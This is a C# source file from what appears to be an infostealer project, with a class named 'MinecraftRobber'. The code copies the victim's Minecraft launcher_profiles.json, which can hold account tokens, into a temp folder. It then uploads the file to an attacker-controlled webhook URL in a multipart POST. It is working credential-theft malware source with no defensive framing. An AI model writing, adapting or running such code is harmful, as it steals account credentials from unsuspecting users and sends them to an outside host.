using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
namespace Luci4.GrabbingShit
{
    public class MinecraftRobber
    {

        public static void GetMinecraft()
        {
            string target = Asmodeus.appData + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
            Console.WriteLine("copy to : " + Asmodeus.tempFolder + "\\launcher_profiles.json");
            if (File.Exists(target))
            {
                File.Copy(target, Asmodeus.tempFolder + "\\launcher_profiles.json");
                string Webhook_link = Program.webhookurll;

                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(Asmodeus.tempFolder + "\\launcher_profiles.json");
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "launcher_profiles.json");
                    httpClient.PostAsync(Webhook_link, form).Wait();
                    httpClient.Dispose();
                }
            }

            else
            {
            }
        }
    }
}
